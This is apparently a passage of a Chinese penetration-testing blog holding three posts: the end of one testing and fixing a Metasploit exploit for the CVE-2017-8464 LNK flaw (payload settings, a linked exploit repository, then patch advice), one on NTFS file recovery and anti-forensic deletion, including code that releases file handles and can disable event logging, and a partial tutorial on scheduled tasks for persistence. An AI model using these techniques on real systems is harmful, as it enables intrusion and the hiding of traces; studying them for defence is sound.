<p>成功执行calc.exe，但是进程explorer.exe崩溃</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>U盘内的利用脚本可通过格式化U盘删除</p>

<p>接着又分别做了如下测试：</p>

<ul>
  <li>测试Win10 x64</li>
  <li>更换payload： set payload windows/x64/meterpreter/reverse_tcp</li>
</ul>

<p>依旧是同样的结果</p>

<p>查看github，其他人也遇到了同样的问题，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-5.png" alt="Alt text"></p>

<p>更多回复见：https://github.com/rapid7/metasploit-framework/pull/8767</p>

<p><strong>4、更多测试</strong></p>

<p>尝试测试32位系统</p>

<p>该脚本支持32位系统，切换命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set target 1
set payload windows/exec
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-6.png" alt="Alt text"></p>

<p>但是测试结果不尽人意，依旧失败</p>

<h2 id="0x04-bug修复">0x04 bug修复</h2>
<hr>

<p>省略调试过程，直接给出一种最简单的解决方法：<strong>更换dll</strong></p>

<p>msf利用脚本共生成24个文件，分别为1个dll文件和23个lnk文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/3-1.png" alt="Alt text"></p>

<p>注：</p>

<p>对于23个lnk文件，文件名最后一位代表U盘盘符，如果测试系统U盘为E盘，那么只留下文件名最后一位为”E”的lnk文件就好，其他lnk文件可以删除</p>

<p>bug产生的原因在于dll，将其换成自己的dll就好</p>

<p>32位可供测试的dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calc.dll</p>

<p>64位可供测试的dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calc_x64.dll</p>

<p>不会导致进程explorer.exe崩溃，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/3-2.png" alt="Alt text"></p>

<p>插入U盘自动播放触发漏洞的测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/3-3.gif" alt="Alt text"></p>

<p>至此，bug成功修复</p>

<p>测试EXP地址：</p>

<p>https://github.com/3gstudent/CVE-2017-8464-EXP</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<h3 id="1安装补丁">1、安装补丁</h3>

<p>微软官方补丁下载地址：</p>

<p>https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8464</p>

<p>360漏洞补丁修复工具下载地址：</p>

<p>http://b.360.cn/other/stuxnet3fixtool</p>

<h3 id="2关闭u盘自动播放功能">2、关闭U盘自动播放功能</h3>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对CVE-2017-8464的msf利用脚本进行测试，修复其中的bug，在技术层面上，实现对该漏洞的“完美利用”，请勿用于非法用途，在此再次提醒普通用户勤打补丁的必要。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August  1, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows系统的文件恢复与删除</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，文件的恢复和删除好比矛与盾。</p>

<p>文件恢复是指恢复目标系统已删除的文件，而文件删除是指删除在目标系统上使用过的工具，避免被恢复。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>文件删除的原理</li>
  <li>文件恢复的原理</li>
  <li>利用PowerForensics恢复文件</li>
  <li>利用SDelete删除文件</li>
  <li>利用SDelete删除文件后，能否使用PowerForensics恢复</li>
  <li>通过文件覆盖，防止文件被恢复</li>
  <li>枚举所有进程，搜索指定文件的句柄，释放该句柄，解除文件占用，实现文件删除</li>
  <li>程序实现细节和开源代码</li>
</ul>

<h2 id="0x02-文件删除与恢复的原理">0x02 文件删除与恢复的原理</h2>
<hr>

<p>参考资料：</p>

<p>http://www.ntfs.com/ntfs_basics.htm</p>

<h3 id="基本概念">基本概念</h3>

<p>Windows文件系统大都使用NTFS（New Technology File System）技术</p>

<p>NTFS中每个文件对应一个主文件表(Master File Table，MFT)</p>

<p>MFT作为文件索引，存储文件的属性</p>

<h4 id="文件删除的直观理解">文件删除的直观理解：</h4>

<p>只修改了MFT(即文件属性)，没有修改删除文件的内容</p>

<h4 id="文件恢复的直观理解">文件恢复的直观理解：</h4>

<p>恢复文件的MFT即可</p>

<h3 id="简单测试">简单测试</h3>

<p>新建文件test.txt，写入内容<code class="language-plaintext highlighter-rouge">0123456789</code></p>

<p>使用工具：WinHex</p>

<p>下载地址：</p>

<p>http://www.x-ways.net/winhex/</p>

<p>选择<code class="language-plaintext highlighter-rouge">Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">Open Disk</code>，选择盘符</p>

<p>找到文件test.txt，右键 -&gt; <code class="language-plaintext highlighter-rouge">Navigation</code> -&gt; <code class="language-plaintext highlighter-rouge">Seek FILE Record</code></p>

<p>查看test.txt的MFT信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-30/2-1.png" alt="Alt text"></p>

<p>MFT的结构如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-30/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片截取自http://www.blogfshare.com/detail-ntfs-filesys.html</p>

<p>接下来删除文件test.txt，并且清空回收站的文件</p>

<p>使用WinHex再次查看硬盘内容，关闭当前盘符，重新选择<code class="language-plaintext highlighter-rouge">Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">Open Disk</code>，选择盘符</p>

<p>弹框提示，选择更新快照，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-30/2-3.png" alt="Alt text"></p>

<p>再次查看MFT结构，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-30/2-4.png" alt="Alt text"></p>

<p>经对比发现，区别如下：</p>

<ul>
  <li>偏移0x08</li>
  <li>偏移0x10，数值加1</li>
  <li>偏移0x16，由1变为0</li>
</ul>

<p>在WinHex界面中选择恢复文件，成功恢复文件</p>

<p><strong>注：</strong></p>

<p>恢复成功的前提是该文件尚未被覆盖</p>

<p>综上，文件恢复的原理可以简单理解如下：</p>

<p><strong>文件删除操作仅修改了文件的MFT，如果文件内容尚未被覆盖，就能恢复文件</strong></p>

<h2 id="0x03-利用powerforensics恢复文件">0x03 利用PowerForensics恢复文件</h2>
<hr>

<p>文件恢复软件有多种，这里给出一个通过powershell实现文件恢复的工具：PowerForensics</p>

<p>工程地址：</p>

<p>https://github.com/Invoke-IR/PowerForensics/</p>

<p>下载地址：</p>

<p>https://github.com/Invoke-IR/PowerForensics/releases</p>

<p><strong>注：</strong></p>

<p>PowerForensicsv2.zip对应Powershell v2，为Win7和Sever2008默认版本</p>

<p>工具使用方法可直接参考xpn的博客：</p>

<p>https://blog.xpnsec.com/offensive-forensics/</p>

<p>获得所有可供恢复的文件列表，powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -executionpolicy bypass
import-module .\PowerForensicsv2.psd1
Get-ForensicFileRecord | Where {$_.Deleted -eq $true} | Select FullName
</code></pre></div></div>

<p>恢复指定的文件<code class="language-plaintext highlighter-rouge">C:\test.txt</code>，保存为<code class="language-plaintext highlighter-rouge">recovered.txt</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$file = Get-ForensicFileRecord | Where {$_.FullName -eq "C:\test.txt"}
$file.CopyFile("recovered.txt")
</code></pre></div></div>

<h2 id="0x04-防止文件被恢复">0x04 防止文件被恢复</h2>
<hr>

<h3 id="1使用工具sdelete">1、使用工具SDelete</h3>

<p>下载地址：</p>

<p>https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete</p>

<p>删除命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sdelete64.exe -accepteula C:\test.txt
</code></pre></div></div>

<h3 id="2通过c实现">2、通过c++实现</h3>

<p>经过0x01的原理分析，我们知道，只要覆盖原文件即可避免文件被恢复</p>

<h4 id="最简单的实现思路">最简单的实现思路：</h4>

<p>修改原文件的内容，填充随机字符串，然后再删除文件</p>

<p>我写了一个简单的测试代码，将待删除的文件内容先填充为0，再删除文件，即使文件被恢复，内容也全是0，可供参考的c代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("\nOverwrite the file,avoid being restored\n\n");
		printf("Usage:\n");
		printf("%s &lt;File Path&gt;\n",argv[0]);
		return 0;
	}
	printf("[*]Try to overwrite file &lt;%s&gt;   ", argv[1]);
	FILE* fp;
	int err = fopen_s(&amp;fp, argv[1], "rb+");
	if (err != 0)
	{
		printf("\n[!]Openfile error!");
		return 0;
	}
	fseek(fp, 0, SEEK_END);
	int len = ftell(fp);
	char *buf = new char[len];
	memset(buf, 0, len);
	fclose(fp);
	err = fopen_s(&amp;fp, argv[1], "wb+");
	if (err != 0)
	{
		printf("\n[!]Openfile error!");
		return 0;
	}
	fwrite(buf, len, 1, fp);
	fclose(fp);
	printf("done\n");

	printf("[*]Try to delete file   &lt;%s&gt;   ", argv[1]);
	if(DeleteFile(argv[1])!=0)
		printf("done\n");
	else
		printf("error\n");
	return 0;
}
</code></pre></div></div>

<h2 id="0x05-解除文件占用">0x05 解除文件占用</h2>
<hr>

<p>在实际删除文件的时候，常常会碰到文件被占用导致无法删除的情况</p>

<p>这里需要找到占用文件的进程，获得文件句柄，释放句柄后才能删除文件</p>

<p>实现思路如下：</p>

<ul>
  <li>程序提升至debug权限</li>
  <li>枚举所有进程</li>
  <li>获得指定文件的句柄</li>
  <li>释放该句柄</li>
</ul>

<p>具体对应到程序实现上，需要注意以下问题：</p>

<h3 id="1提升至debug权限">1、提升至debug权限</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}
</code></pre></div></div>

<h3 id="2枚举所有进程获得指定文件的句柄">2、枚举所有进程，获得指定文件的句柄</h3>

<p>使用内核API NtQuerySystemInformation查询SystemHandleInformation，获得所有进程的句柄</p>

<p>筛选出类型为文件的句柄： <code class="language-plaintext highlighter-rouge">ObjectTypeNumber = 0x1e</code></p>

<p>如果无法打开句柄对应的进程，留下标志位，不再重复打开该进程</p>

<p>过滤出有可能导致挂起的句柄，利用API WaitForSingleObject进行判断</p>

<h3 id="3释放句柄">3、释放句柄</h3>

<p>使用内核API NtQuerySystemInformation查询SystemHandleInformation得到的句柄是伪句柄，无法直接释放</p>

<p>需要使用API DuplicateHandle将伪句柄转为实句柄</p>

<p>函数模型如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL WINAPI DuplicateHandle(
  _In_  HANDLE   hSourceProcessHandle,
  _In_  HANDLE   hSourceHandle,
  _In_  HANDLE   hTargetProcessHandle,
  _Out_ LPHANDLE lpTargetHandle,
  _In_  DWORD    dwDesiredAccess,
  _In_  BOOL     bInheritHandle,
  _In_  DWORD    dwOptions
);
</code></pre></div></div>

<p>第7个参数设置为DUPLICATE_CLOSE_SOURCE，表示会释放源进程中的句柄</p>

<p>具体参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DuplicateHandle(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &amp;dupHandle, 0, 0, DUPLICATE_CLOSE_SOURCE)
</code></pre></div></div>

<p>完整代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Catch-specified-file-s-handle</p>

<p>代码实现了枚举当前系统的所有进程，找到指定文件的句柄，对其释放</p>

<p>不仅可以用来解除文件占用，而且可以用来禁用日志的某些功能</p>

<p>例如如果释放了system.evtx的句柄，那么日志服务无法向system.evtx写入日志，导致system.evtx下的日志失效</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文简单介绍了文件删除与恢复的原理，测试工具，编写程序利用文件覆盖防止文件被恢复，并且解决了文件占用的问题，开源代码。</p>

<p>站在渗透的角度，一是想办法恢复目标系统的文件，二是安全删除自己的工具，避免被恢复。</p>

<p>站在防御的角度，清除重要的文件可使用工具SDelete进行安全删除</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 30, 2018
  </div>

  
</article><article class="post">
  <h1>渗透基础——Windows下计划任务的使用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，尤其是域渗透，常常会用到Windows系统的计划任务，一是用于远程启动程序，二是用于程序的自启动</p>

<p>那么，计划任务具体有哪些使用技巧呢？是否对权限有要求？一定需要管理员权限才能运行吗？</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>命令行实现</li>
  <li>c++实现</li>
  <li>不同权限下创建计划任务的区别</li>
  <li>COM组件ITaskService能否提权运行</li>
  <li>命令行开启和关闭计划任务</li>
  <li>日志位置</li>
</ul>

<h2 id="0x02-简介">0x02 简介</h2>
<hr>

<p>官方说明文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa446802(v=vs.85).aspx</p>

<p>需要开启服务<code class="language-plaintext highlighter-rouge">Task Scheduler</code></p>

<p>可在以下情况触发：</p>

<ul>
  <li>When a specific system event occurs.</li>
  <li>At a specific time.</li>
  <li>At a specific time on a daily schedule.</li>
  <li>At a specific time on a weekly schedule.</li>
  <li>At a specific time on a monthly schedule.</li>
  <li>At a specific time on a monthly day-of-week schedule.</li>
  <li>When the computer enters an idle state.</li>
  <li>When the task is registered.</li>
  <li>When the system is booted.</li>
  <li>When a user logs on.</li>
  <li>When a Terminal Server session changes state.</li>
</ul>

<p>计划任务创建后，会在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\Tasks</code>保存XML格式的配置文件</p>

<h2 id="0x03-计划任务的配置方式">0x03 计划任务的配置方式</h2>
<hr>

<h3 id="1界面操作">1、界面操作</h3>

<p>执行taskschd.msc，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/2-1.png" alt="Alt text"></p>

<p>选中<code class="language-plaintext highlighter-rouge">Task Scheduler Library</code> ，右键 -&gt; <code class="language-plaintext highlighter-rouge">Create Task...</code></p>

<p>弹出界面，逐个配置即可，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/2-2.png" alt="Alt text"></p>

<h3 id="2命令行配置">2、命令行配置</h3>

<h4 id="1-at-命令">(1) at 命令</h4>

<p>(管理员权限)</p>

<p>eg：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>at 23:53 notepad.exe
</code></pre></div></div>

<p>默认以system权限启动，适用于Win7</p>

<p>从Win8开始不再支持at命令，所以不过多介绍</p>

<h4 id="2-schtasks命令">(2) schtasks命令</h4>

<p>支持Win7-Win10</p>

<p><strong>1.每天固定时间，以普通权限启动notepad.exe</strong></p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /Create /TN TestService1 /SC DAILY /ST 01:02 /TR notepad.exe
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\Tasks</code>产生新文件TestService1，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Date&gt;2018-05-23T17:21:00&lt;/Date&gt;
    &lt;Author&gt;a&lt;/Author&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;CalendarTrigger&gt;
      &lt;StartBoundary&gt;2018-05-23T01:02:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;ScheduleByDay&gt;
        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;
      &lt;/ScheduleByDay&gt;
    &lt;/CalendarTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;notepad.exe&lt;/Command&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;UserId&gt;WIN-R7MM90ERBMD\a&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
      &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
&lt;/Task&gt;
</code></pre></div></div>

<p>值得注意的是<code class="language-plaintext highlighter-rouge">&lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</code>，代表权限为普通用户</p>

<p><strong>2.每天固定时间，以system权限启动notepad.exe</strong></p>

<p>命令如下(管理员权限)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /Create /TN TestService2 /SC DAILY /ST 01:02 /TR notepad.exe /RL HIGHEST
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\Tasks</code>产生新文件TestService2，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Date&gt;2018-05-23T17:23:23&lt;/Date&gt;
    &lt;Author&gt;a&lt;/Author&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;CalendarTrigger&gt;
      &lt;StartBoundary&gt;2018-05-23T01:02:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;ScheduleByDay&gt;
        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;
      &lt;/ScheduleByDay&gt;
    &lt;/CalendarTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
      &lt;UserId&gt;WIN-R7MM90ERBMD\a&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;notepad.exe&lt;/Command&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;
</code></pre></div></div>

<p>值得注意的是<code class="language-plaintext highlighter-rouge">&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;</code>，代表权限为最高，一般为System权限</p>

<p><strong>3.每天固定时间，以system权限启动notepad.exe，通过导入xml文件的方式</strong></p>

<p>以文件TestService2作为模板，修改启动时间，保存为1.xml，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Date&gt;2018-05-23T17:23:23&lt;/Date&gt;
    &lt;Author&gt;a&lt;/Author&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;CalendarTrigger&gt;
      &lt;StartBoundary&gt;2018-05-23T01:03:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;ScheduleByDay&gt;
        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;
      &lt;/ScheduleByDay&gt;
    &lt;/CalendarTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
      &lt;UserId&gt;WIN-R7MM90ERBMD\a&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;notepad.exe&lt;/Command&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;
</code></pre></div></div>

<p>通过xml文件导入配置，建立计划任务，以system权限启动，命令如下(管理员权限)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /xml c:\test\1.xml /tn TestService3
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果是一个新的系统，修改<code class="language-plaintext highlighter-rouge">&lt;Author&gt;</code>、<code class="language-plaintext highlighter-rouge">&lt;Date&gt;</code>、<code class="language-plaintext highlighter-rouge">&lt;StartBoundary&gt;</code>、<code class="language-plaintext highlighter-rouge">&lt;UserId&gt;</code>和<code class="language-plaintext highlighter-rouge">&lt;Command&gt;</code>即可</p>

<p><strong>4.每天固定时间，以普通权限启动notepad.exe，通过导入xml文件的方式</strong></p>

<p>修改1.xml：</p>

<p><code class="language-plaintext highlighter-rouge">&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;</code>改为<code class="language-plaintext highlighter-rouge">&lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</code>即可</p>

<p>导入配置的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /xml c:\test\1.xml /tn TestService4
</code></pre></div></div>

<p><strong>补充：schtasks的其他命令用法</strong></p>

<p>查看服务状态：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /Query /TN TestService1
</code></pre></div></div>

<p>删除服务：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /Delete /TN TestService1 /F
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>服务执行成功后不会自动删除</p>

<h2 id="0x04-编写程序实现">0x04 编写程序实现</h2>
<hr>

<p>官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa383614(v=vs.85).aspx</p>

<p>c++定时启动程序的实现实例：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa383624(v=vs.85).aspx</p>

<p>程序实现了在特定时间启动notepad.exe</p>

<p>通过分析源码，发现是调用了COM组件<code class="language-plaintext highlighter-rouge">ITaskService</code></p>

<p>于是产生了一个新问题，<strong>能否通过COM组件ITaskService越权执行？</strong></p>

<p>答案是不能，原因如下：</p>

<p>首先，在c代码中能够找到<code class="language-plaintext highlighter-rouge">CLSID_TaskScheduler</code>对应的GUID，位于taskschd.h文件中</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/3-1.png" alt="Alt text"></p>

<p>GUID为<code class="language-plaintext highlighter-rouge">"0f87369f-a4e5-4cfc-bd3e-73e6154572dd"</code></p>

<p>查看注册表信息，路径为<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}</code></p>

<p>信息如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/3-2.png" alt="Alt text"></p>

<p>未发现注册表项<code class="language-plaintext highlighter-rouge">Elevation</code>，也就是说这个COM组件ITaskService不支持使用COM Elevation Moniker提升权限</p>

<p>那么，能否通过添加注册表项<code class="language-plaintext highlighter-rouge">Elevation</code>实现COM组件提升权限呢？</p>

<p>答案也是不可以，测试如下：</p>

<p>修改注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}</code>，需要TrustedInstaller权限</p>

<p>关于如何获得TrustedInstaller权限可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a></p>

<p>接下来添加注册表项<code class="language-plaintext highlighter-rouge">Elevation</code>，值为1</p>

<h3 id="测试1">测试1：</h3>

